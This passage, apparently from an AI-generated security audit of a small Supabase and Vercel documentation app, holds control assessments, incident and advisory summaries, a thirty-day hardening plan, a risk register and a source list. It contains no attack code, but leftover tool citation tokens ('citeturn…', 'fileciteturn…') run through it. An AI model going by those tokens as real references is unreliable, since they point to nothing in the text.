| HSTS | **AGREE** | Keep; do not claim independent preload eligibility |
| Password sign-in | **AGREE** | Fine with long passwords + TOTP |
| No MFA today | **DISAGREE as target state** | Enable TOTP before privileged sharing/admin |
| TOTP is usable at $0 | **AGREE** | Confirmed by current Supabase docs. citeturn22view2 |
| Leaked-password protection unavailable at $0 | **AGREE** | Current Supabase paid-plan distinction. citeturn3search1 |
| Passkeys as immediate primary auth | **DISAGREE for now** | Current Supabase implementation is experimental. citeturn22view3 |
| Invitation token only consumed on explicit action | **AGREE** | Scanner-safe model |
| Gmail 500/day planning number | **DISAGREE / UNVERIFIED** | Primary Google confirmation not obtained |
| Existing app invite limit 20/hour, 60/day | **MODIFY** | Excessive for a handful of collaborators |
| No raw HTML in Markdown | **AGREE** | Keep |
| No `dangerouslySetInnerHTML` for content | **AGREE** | Keep |
| URL scheme allowlist | **AGREE** | Keep and make explicit |
| Remote images disabled in review | **AGREE** | Extend to public share/untrusted previews |
| Mermaid deferred | **AGREE** | Low value relative to active SVG complexity |
| KaTeX only after sanitizer tests | **AGREE** | Correct |
| `user-content-` ID prefix | **AGREE** | Correct DOM-clobbering mitigation |
| fflate ZIP in Worker | **MODIFY** | zip.js has a stronger fit for streaming hostile archives; fflate remains acceptable with version pin/tests |
| Reject traversal/absolute ZIP paths | **AGREE** | Also reject links, collisions and emitted-size bombs |
| Mammoth → sanitize → Turndown | **MODIFY** | Require ≥1.12.3-equivalent patched floor, Worker, external-file disabled |
| Import SVG as normal image | **DISAGREE** | Reject SVG initially |
| Purge or hash invite email | **MODIFY** | Delete duplicate email when possible rather than hash |
| No tokens/IPs in application logs | **AGREE** | Use short-lived pseudonymous rate buckets only where necessary |
| Append-only audit | **AGREE** | Structured security events only |
| Hash chain immediately | **DISAGREE as priority** | Admin can rewrite chain unless externally anchored |
| Weekly head hash email | **MODIFY/DEFER** | Valid evidence mechanism but low initial ROI |
| Dependabot + npm audit + OSV + gitleaks | **AGREE** | Add native CodeQL/secret scanning while public |
| Rely on platform logs as audit | **DISAGREE** | Too short-lived/operational |
| `sb_publishable_` in browser | **AGREE** | Intended public key. citeturn22view6 |
| `sb_secret_` only server-side | **AGREE** | Elevated backend credential. citeturn22view6 |
| Explicit GRANT/RLS/function privileges in migrations before 2026-10-30 | **AGREE** | High-priority hardening based on the verified project/platform transition noted in the updated pack |
| Move every public `SECURITY DEFINER` function to private | **DISAGREE** | Keep genuine API RPCs public; move only internal helpers, and revoke unnecessary execution |
| `search_path=''` + qualified identifiers in definers | **AGREE** | Correct hardening |
| Trash kept forever by default | **MODIFY for PII** | Useful recovery feature, but deleted-user/invite/security PII needs separate finite retention |
| Public repo is intrinsically insecure | **DISAGREE** | Public code can be secure and gets more free GitHub security tooling; data leakage in history is the deciding concern |

## Incidents, unknown unknowns, and outdated guidance

**Relevant security incidents and advisories**

The strongest primary evidence found includes six actual compromise/exploitation events and several directly relevant vulnerability disclosures. I distinguish them rather than pretending every CVE was exploited in the wild.

| Event | Nature | Relevance/lesson |
|---|---|---|
| Confluence CVE-2023-22515 | **Observed exploitation** of broken authorization affecting Confluence Data Center/Server | Documentation software is high-value; a single authorization path can compromise the instance. Atlassian published emergency guidance. citeturn22view14 |
| Confluence CVE-2023-22518 | **Observed attacks/ransomware activity** following an improper-authorization vulnerability | “Private docs app” does not make authorization bugs low impact. citeturn22view15 |
| Vite filesystem-deny bypasses disclosed in 2023/2025 | Vulnerability disclosures | Never expose Vite dev server to hostile networks and keep current Vite patched. citeturn17search6turn17search4turn17search5 |
| `chalk`/`debug` npm compromise, September 2025 | **Real package compromise** | A trusted maintainer/account can be the supply-chain entry point; popularity is not safety. citeturn12search1 |
| Shai-Hulud, September 2025 | **Real npm worm/supply-chain compromise** | Install-time code can steal credentials and propagate through maintainer access. citeturn22view9 |
| Shai-Hulud 2.0, November 2025 | **Real supply-chain compromise** | The class persisted/evolved; build secrets remain a high-value target. citeturn22view19 |
| Axios malicious-package compromise, March 2026 | **Real package compromise** | Lockfile search, redeployment and secret rotation are practical post-compromise actions. citeturn22view18 |
| Mammoth directory traversal / file disclosure, 2025 | Vulnerability disclosure | Document converters can cross file boundaries; converter is not a sanitizer. citeturn22view16 |
| Mammoth prototype pollution / local file disclosure, 2026 | Vulnerability disclosure | `.docx` parsing remains an active attack surface even after an earlier fix. citeturn22view17 |
| Mammoth ReDoS, 2026 | Vulnerability disclosure | Worker/time budget is needed in addition to version pinning. citeturn8search9 |

**Unknown unknowns**

The most important 2025–2026 developments that deserve inclusion even though the previous plans did not emphasize all of them are:

1. **Build-time secret theft is now a first-class threat.** The npm attacks show that secrets exposed to package install/build scripts are attractive targets; reducing build environment credentials is as important as checking the final browser bundle. citeturn22view9turn12search1

2. **Passkeys exist in Supabase now, but “available” is not the same as “ready to be your only authentication method.”** The experimental status argues for waiting. citeturn22view3

3. **Dependency release age/cooldowns are now practical ecosystem controls.** GitHub changed Dependabot behavior after 2025 supply-chain compromises; do not auto-adopt minutes-old versions. citeturn12search1

4. **Document converters need security lifecycle ownership.** Mammoth accumulated multiple distinct vulnerability classes in a short period. A format importer should therefore be treated as an ongoing security subsystem. citeturn22view16turn22view17turn8search9

5. **Capability leakage through third-party subresources is easy to overlook even with fragments.** Fragments solve HTTP-server and referrer transmission; they do not stop browser extensions, history sync, screenshots or JavaScript that can read `location.href`. citeturn22view0turn0search14

6. **A previously registered service worker is part of the trust boundary.** A public-share shell should not rely on sensitive API response caching/offline functionality.

7. **Project-wide sharing and future “restricted documents” are semantically incompatible.** The master plan contains both ideas; one must win. fileciteturn0file1

8. **Trusted Types is worth introducing in Report-Only even though it is not universal browser protection.** It gives an additional Chromium-side signal around dangerous DOM sinks while the app continues to rely on framework/sanitizer discipline elsewhere.

9. **Repository visibility changes the free GitHub security product you receive.** “Make it private” is not an uncomplicated security win on GitHub Free. citeturn22view7turn10search12turn9search0

10. **Capability abuse is primarily a quota/availability problem, not an entropy problem.** Rate-limit invalid traffic to preserve the free plan, not because an attacker can feasibly search a 256-bit space.

**What became outdated in 2025–2026**

| Older assumption | 2026 position |
|---|---|
| Production deployment protection on Vercel necessarily requires Pro | **Outdated.** Vercel announced free production deployment protection across plans in September 2026. citeturn22view5 |
| Supabase has no passkey support | **Outdated.** Passkeys now exist, but remain experimental. citeturn22view3 |
| A normal Mammoth install is a low-risk `.docx` conversion layer | **Outdated.** Multiple 2025–2026 advisories require a current version plus sandboxing. citeturn22view16turn22view17turn8search9 |
| Package-lock + `npm audit` is enough supply-chain protection | **Outdated.** 2025–2026 compromises justify cooldowns, full-SHA Actions, lifecycle-script scrutiny and build-secret isolation. citeturn22view9turn12search1 |
| GitHub public/private visibility does not affect free security tooling | **Outdated.** Several native controls differ materially by visibility/plan. citeturn22view7turn10search12 |
| URL fragments make capability URLs “safe” | **Incomplete.** They stop normal HTTP/referrer transmission of the fragment, not browser-local leakage. citeturn22view0turn0search14 |
| Hash-route-specific security headers can be configured on Vercel | **Wrong.** The server never receives the fragment. Use a dedicated path or global headers. citeturn0search14 |
| Free-tier leaked-password protection can simply be turned on | **Outdated/wrong for this plan.** Current Supabase documentation places it on paid plans. citeturn3search1 |
| The older PDF claim that Supabase Free has managed daily backups | **Wrong.** The updated PDF correctly retracts it. fileciteturn0file0 |
| Legacy Supabase JWT API keys are the preferred key scheme | **Outdated.** The app has correctly moved to publishable/secret keys; finish removing legacy fallback. fileciteturn0file0 |
| Default SMTP behavior/templates can be assumed unchanged | **Outdated risk.** Supabase changed Free default-SMTP behavior/template customization for new projects in 2026. citeturn19search20 |

## Thirty-day plan and risk register

**Prioritized thirty-day plan**

| Priority | Work | Effort | Touches |
|---|---|---:|---|
| 1 | Add/test owner TOTP; document owner-account recovery before enforcing AAL2 | S | Supabase Auth dashboard, auth UI |
| 2 | Full-history secret scan; enable GitHub secret scanning/push protection/Dependabot/CodeQL while public | S | GitHub settings, `.github/`, `.gitleaks.toml` |
| 3 | Classify all ~42 public `SECURITY DEFINER` functions; revoke PUBLIC/anon; move internal-only functions private; verify `search_path=''` | M | new Supabase hardening migration, SQL matrix |
| 4 | Land explicit GRANT/RLS/function-execute migration policy before the platform grant transition | S | `supabase/migrations/*`, SQL tests |
| 5 | Move runtime inline CSS string to imported Vite CSS | S | `parts/20-styles.tsx`, entry/import build |
| 6 | Add `vercel.json`; deploy CSP Report-Only and other headers; remove Google Fonts | S | `vercel.json`, CSS/font references |
| 7 | Add Playwright header/CSP/no-third-party tests | S | Playwright suite |
| 8 | Implement `/share#secret` shell and inert/explicit redemption UX before any public share backend | M | router, share view, Vercel rewrite |
| 9 | Implement proxy-based share redemption with strict projection, expiry/revocation and no-store | M | Edge/Vercel function, migration, tests |
| 10 | Add share kill switch and `revoke all links` owner path | S | migration, admin UI |
| 11 | Implement invitation-bound account creation; disable public signup; add Turnstile | M | `/api/join`, Auth settings, join UI |
| 12 | Enforce AAL2 in sensitive admin/share RPCs | M | SQL functions/policies, MFA UX |
| 13 | Replace Markdown renderer with explicit sanitize/URL/image policy and run M01–M19 corpus | M | Markdown component, unit/Playwright tests |
| 14 | Add structured `private.security_audit_log`; stop logging unnecessary identifiers | M | migration, privileged RPCs |
| 15 | Ship Markdown ZIP importer only, in Worker with hard caps; defer `.docx`/Notion/SVG | M | importer Worker, tests |

**Risk register**

| Risk | Likelihood | Impact | Current state | Residual after plan |
|---|---|---:|---|---|
| Owner infrastructure-account takeover | Low/Medium | Critical | Unknown MFA posture | Medium/Low |
| Overprivileged `SECURITY DEFINER` RPC | Medium | Critical | ~42 functions, 28 authenticated-callable reported | Low after inventory/tests |
| Share projection leak | Medium | Critical | Not built | Low with proxy/allowlist |
| Share capability forwarded/stolen | Medium | High | Planned | Medium; bearer-link nature remains |
| Stored XSS from Markdown/import | Medium | Critical | Content untrusted | Low with strict renderer/CSP |
| Remote-image exfiltration | Medium | High | Planned sanitization | Low |
| Malicious archive/docx DoS | Medium | High | Import planned | Low if deferred/capped |
| npm supply-chain compromise | Low/Medium | Critical | No scanning today | Medium/Low |
| Secret committed to public Git | Medium | Critical | No scanning today | Low after layered scanning |
| Invite-email spam relay | Low/Medium | High | Vercel SMTP endpoint exists | Low with fixed recipient/AAL2 |
| Password compromise | Medium | High | No MFA today | Medium/Low after TOTP |
| Free-tier quota exhaustion | Medium | Medium/High | Limited controls | Medium |
| Insufficient forensic history | Medium | Medium | platform logs only/partial app audit | Low |
| Excess personal-data retention | Medium | Medium | undefined retention | Low |
| Loss of sole-owner MFA access | Low | Critical | no tested recovery | Low after rehearsal |
| Public-repo accidental content leak | Medium | High | repo currently public | Depends on history audit |

## Questions, uncertainty, and research appendix

**The eight most important owner decisions**

These are the next decisions with the largest security consequences; they do not block the recommendations above.

1. **Will TOTP be mandatory for every invited account or only owner/admin/manager roles?** Recommendation: mandatory for privileged roles immediately; strongly encourage all users.

2. **May a project-wide share contain uploaded images at all?** Recommendation: no Storage-backed images in v1 public sharing.

3. **Has any real document, email address, Supabase secret, Gmail credential, Playwright trace or production snapshot ever entered Git history?** This determines whether keeping the repository public is a reasonable privacy choice.

4. **What share lifetime best matches actual use?** Recommendation: seven-day default, independently revocable recipient-labelled links.

5. **Should a project with a future `restricted` document be shareable project-wide?** Recommendation: no; project-wide sharing and excluded documents should not pretend to be the same concept.

6. **Will all destructive/security-sensitive owner actions require AAL2, including share creation/revocation and exports?** Recommendation: yes.

7. **What bounded retention period should security events and expired invitation metadata use?** Recommendation: choose an explicit finite period rather than “forever”.

8. **After OSS scanning is installed, is code transparency or repository privacy more valuable to you?** The technical security model should work under either choice.

**Ten least-certain claims and how to verify them**

| Claim | Confidence | Verification |
|---|---|---|
| Exact current Supabase invitation-email lifetime/default | Medium/Low; docs have conflicting contexts | Inspect live Auth OTP-expiry dashboard value and run timed disposable invite |
| Exact behavior of Microsoft Safe Links with JavaScript-driven fragment pages in 2026 | Low | Send test link to an account protected by Safe Links; inspect server/Edge logs before human click |
| Exact consumer Gmail app-password SMTP sending ceiling | Low | Use current official Google Workspace/Gmail documentation or support page; do not load-test production |
| Exact built-in recovery-code support for Supabase application TOTP | Low | Inspect current MFA dashboard/API documentation and test disposable user |
| Whether multiple independent TOTP factors provide a practical recovery path in current Supabase Auth | Medium/Low | Disposable account enrolment/recovery test |
| Exact Free-plan Supabase platform-log retention relevant to this project | Medium/Low | Check current Supabase Logs documentation/dashboard directly |
| Whether Vercel Bot Protection runs before every external rewrite configuration you might use for a share proxy | Medium/Low | Deploy benign test rewrite and compare bot-protection event behavior |
| Current HSTS preload status inherited from `vercel.app` | Low/irrelevant to design | Check the current HSTS preload service; do not add `preload` yourself |
| Exact npm 2026 `allow-scripts` / `min-release-age` config syntax for your pinned npm | Medium | Run `npm help config`/official npm docs for the exact installed major before committing `.npmrc` |
| Specific Notion/Google Docs/BookStack/GitHub historical share-link leakage claims from the PDFs | Low | Require a first-party incident/advisory for each; until then label them UNVERIFIED |

**Research sub-questions**

The audit was structured around the following concrete questions; more than sixty distinct web searches were performed, with primary sources preferred and weak claims rejected rather than filled by inference.

1. What security authority does possession of a capability URL confer?
2. Which capability leakage channels are addressed by a URL fragment?
3. Which leakage channels remain after moving the secret to a fragment?
4. Can `/share` receive HTTP headers that `/#/s/...` cannot?
5. Should redemption happen automatically or require a user gesture?
6. Is 256-bit entropy excessive, adequate or insufficient?
7. Does a random share capability need Argon2/bcrypt rather than SHA-256?
8. Is constant-time comparison meaningful for indexed hashed capabilities?
9. Which fields are safe in a project-wide public projection?
10. How should share search avoid revealing hidden documents?
11. How should revocation interact with caching and JWTs?
12. What anonymous telemetry is useful without creating an IP-tracking database?
13. Can direct PostgREST/RPC sharing be isolated from the rest of the Data API?
14. Does an Edge-minted custom JWT create broader authority than the share needs?
15. How easily can the Free Edge Function allowance be exhausted?
16. Should multiple recipient-specific links still be project-wide?
17. What account-creation flow works when public signup is disabled?
18. Can the existing email-bound invite itself prove mailbox possession?
19. How do link scanners affect one-time Auth links?
20. Is password auth defensible at $0 without leaked-password screening?
21. What password rules are consistent with current NIST guidance?
22. Is Supabase TOTP available on Free?
23. Can AAL2 be enforced in RLS and RPCs?
24. Is passkey/WebAuthn support stable enough in Supabase in October 2026?
25. Which session controls are Free and which are paid?
26. How should owner MFA recovery work with a single app owner?
27. Which CAPTCHA provider can be used without paying?
28. How should sign-in/account-creation responses resist account enumeration?
29. Which redirects should be allow-listed?
30. Can PKCE solve Supabase invitation flows that cross browser contexts?
31. Which CSP directives does a Vite production SPA actually need?
32. Does the current inline CSS architecture force `unsafe-inline`?
33. Can Google Fonts be removed entirely?
34. Can share-only no-referrer/noindex work with hash routing?
35. Should no-referrer/noindex simply be global for a private app?
36. What should be cached for HTML versus fingerprinted assets?
37. Is HSTS preload appropriate on a `*.vercel.app` hostname?
38. Does Trusted Types add useful defense without becoming the primary XSS control?
39. Can CSP reporting itself become an anonymous abuse/PII endpoint?
40. Which Markdown features require sanitization beyond `react-markdown` defaults?
41. Which URL schemes should be accepted in rendered Markdown?
42. Should untrusted Markdown ever fetch remote images?
43. How should generated heading IDs avoid DOM clobbering?
44. Should SVG be considered an image or active content?
45. How should YAML front matter avoid prototype pollution and alias bombs?
46. How should CSV exports avoid spreadsheet formula execution?
47. Which ZIP library provides the best browser streaming/Worker model?
48. Which path forms must the importer reject?
49. How are size/ratio limits enforced when ZIP metadata lies?
50. Which recent vulnerabilities affect Mammoth `.docx` conversion?
51. Should `.docx` conversion be a v1 feature at all?
52. Which Notion/Obsidian content should be ignored rather than interpreted?
53. Which GitHub security controls are free only while the repository is public?
54. Which controls remain if the repository becomes private?
55. How should GitHub Actions be pinned and permission-scoped?
56. Can fork PRs ever receive production secrets?
57. What did the 2025 `chalk`/`debug` compromise demonstrate?
58. What did Shai-Hulud demonstrate about install scripts and maintainer credentials?
59. What did the 2026 Axios compromise change operationally?
60. Is `npm ci` plus a lockfile sufficient?
61. Can dependency release cooldowns materially reduce supply-chain exposure?
62. Should lifecycle scripts be disabled in deployment builds?
63. Is a Supabase publishable key actually a secret?
64. What is the correct incident response for a leaked Supabase secret key?
65. Which personal data is duplicated outside `auth.users`?
66. Should an expired invitation retain an email address?
67. Should members normally see each other’s emails?
68. What data should survive deletion to preserve revision integrity?
69. Does a household/personal privacy exemption plausibly apply?
70. What privacy practices make sense even if no statute applies?
71. Is `pgaudit` appropriate for continuous logging on a 500 MB database?
72. What small event set gives useful incident reconstruction?
73. Can an in-database hash chain actually resist the database owner?
74. How should anonymous rate limiting avoid permanent IP retention?
75. Can the Gmail endpoint become an open relay?
76. Which public endpoints can simply be eliminated?
77. Which quotas are vulnerable to anonymous exhaustion?
78. What emergency switches should exist before sharing ships?
79. In what order should a secret leak be rotated and investigated?
80. What recovery material must exist before enforcing MFA on the sole owner?

## Dated source list

All web sources below were accessed **October 22, 2026**, unless the source itself is an older normative/specification document. Primary documentation, standards, official repositories and vendor advisories were prioritized.

**Capability URLs, browser/referrer behavior**

1. W3C TAG, *Capability URLs* source/finding — https://github.com/w3ctag/capability-urls/blob/gh-pages/index.html citeturn22view0
2. W3C, *Referrer Policy* — https://www.w3.org/TR/referrer-policy/ citeturn20view1
3. MDN, URI fragments — https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment citeturn0search14
4. MDN, `Referer` — https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer citeturn0search0
5. MDN, `Referrer-Policy` — https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy citeturn0search7

**Authentication**

6. NIST SP 800-63B / Digital Identity Guidelines — https://pages.nist.gov/800-63-4/sp800-63b.html citeturn3search10
7. Supabase, *User sessions* — https://supabase.com/docs/guides/auth/sessions citeturn22view1
8. Supabase, *Multi-Factor Authentication — TOTP* — https://supabase.com/docs/guides/auth/auth-mfa/totp citeturn22view2
9. Supabase, *MFA* — https://supabase.com/docs/guides/auth/auth-mfa citeturn20view5
10. Supabase, *Passkey authentication* — https://supabase.com/docs/guides/auth/passkeys citeturn22view3
11. Supabase, *Users* — https://supabase.com/docs/guides/auth/users citeturn22view4
12. Supabase, password security — https://supabase.com/docs/guides/auth/password-security citeturn3search1
13. Supabase, Auth rate limits — https://supabase.com/docs/guides/auth/rate-limits citeturn2search19
14. Supabase, CAPTCHA — https://supabase.com/docs/guides/auth/auth-captcha citeturn21view13turn19search15
15. Supabase, redirect URLs — https://supabase.com/docs/guides/auth/redirect-urls citeturn4search1
16. Supabase JavaScript Admin `createUser` — https://supabase.com/docs/reference/javascript/auth-admin-createuser citeturn21view12

**Supabase backend/security**

17. Supabase, *API keys* — https://supabase.com/docs/guides/getting-started/api-keys citeturn22view6
18. Supabase, *Edge Function limits* — https://supabase.com/docs/guides/functions/limits citeturn22view12
19. Supabase, PostgreSQL `pgaudit` — https://supabase.com/docs/guides/database/extensions/pgaudit citeturn21view0

**Browser rendering and content**

20. `react-markdown` official repository — https://github.com/remarkjs/react-markdown citeturn20view11turn7search2
21. `rehype-sanitize` official repository — https://github.com/rehypejs/rehype-sanitize citeturn20view10turn7search1
22. zip.js official repository — https://github.com/gildas-lormeau/zip.js citeturn8search8
23. fflate official repository — https://github.com/101arrowz/fflate citeturn8search10turn8search16
24. JSZip official repository/documentation — https://github.com/Stuk/jszip citeturn8search0turn8search1
25. GitHub Advisory, Mammoth directory traversal / CVE-2025-11849 — https://github.com/advisories/GHSA-rmjr-87wv-gf87 citeturn22view16
26. GitHub Advisory, Mammoth / CVE-2026-97151 — https://github.com/advisories/GHSA-89qm-22qm-xf5h citeturn22view17
27. GitHub Advisory Database search, Mammoth CVE-2026-105219 — https://github.com/advisories?query=CVE-2026-105219 citeturn8search9

**Vercel**

28. Vercel, project configuration / `vercel.json` — https://vercel.com/docs/project-configuration citeturn20view9
29. Vercel, security headers — https://vercel.com/docs/headers/security-headers citeturn18search20
30. Vercel, Runtime Logs — https://vercel.com/docs/logs/runtime citeturn22view10
31. Vercel, *Bot Protection is now generally available* — https://vercel.com/changelog/bot-protection-is-now-generally-available citeturn22view11
32. Vercel, *Protect production deployments for free on every plan* — https://vercel.com/changelog/protect-production-deployments-for-free-on-every-plan citeturn22view5
33. Vercel, *Axios package compromise and remediation steps* — https://vercel.com/changelog/axios-package-compromise-and-remediation-steps citeturn22view18
34. Vercel, *Shai-Hulud 2.0 Supply Chain Compromise* — https://vercel.com/changelog/shai-hulud-2-0-supply-chain-compromise citeturn22view19

**GitHub and npm supply chain**

35. GitHub Docs, secret scanning — https://docs.github.com/en/code-security/how-tos/secure-your-secrets/detect-secret-leaks/enable-secret-scanning citeturn22view7
36. GitHub Docs, Dependabot security updates — https://docs.github.com/en/code-security/concepts/supply-chain-security/dependabot-security-updates citeturn22view8
37. GitHub Docs, code scanning/CodeQL — https://docs.github.com/en/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning-with-codeql citeturn10search12
38. GitHub Docs, rulesets — https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets citeturn9search0
39. GitHub Docs, Actions security hardening — https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions citeturn20view13
40. GitHub Blog, *Our plan for a more secure npm supply chain* — https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/ citeturn22view9

**Document-product/security incidents**

41. Atlassian, CVE-2023-22515 Confluence authorization vulnerability — https://confluence.atlassian.com/security/cve-2023-22515-improper-authorization-vulnerability-in-confluence-data-center-and-server-1295682276.html citeturn22view14
42. Atlassian, CVE-2023-22518 Confluence authorization vulnerability — https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-confluence-server-1311473907.html citeturn22view15

**Privacy**

43. UK Information Commissioner’s Office, personal/household-use guidance — official ICO guidance retrieved in this research. citeturn21view4turn21view5
44. EUR-Lex, Regulation (EU) 2016/679, including Article 17 — https://eur-lex.europa.eu/eli/reg/2016/679/oj citeturn14search12

**Updated project evidence**

45. *01-context-pack(2).pdf*, updated October 22, 2026 — live stack, database, Auth, Vercel and repository state. fileciteturn0file0
46. *02-master-plan-v2(2).pdf*, v2.1 — current security/sharing/import/operations plan. fileciteturn0file1
47. *03-prior-research(2).pdf* — prior AI-generated research; used only as hypotheses and explicitly rejected where primary confirmation was unavailable. fileciteturn0file2
48. *04-vision-architecture-security(2).pdf*, updated October 22, 2026 — current architecture, function inventory and security state. fileciteturn0file3

**Primary-source gaps explicitly left UNVERIFIED:** exact consumer Gmail SMTP daily limit; Microsoft Safe Links’ precise 2026 JavaScript/click behavior; exact Supabase app-TOTP recovery-code capability; current inherited HSTS-preload state for `vercel.app`; exact npm `allow-scripts`/`min-release-age` syntax for the project’s installed npm release; exact current Supabase Free log-retention duration; exact current Free Realtime quotas; and the prior PDFs’ specific Notion/Google Docs/BookStack/GitHub share-leak case-study claims.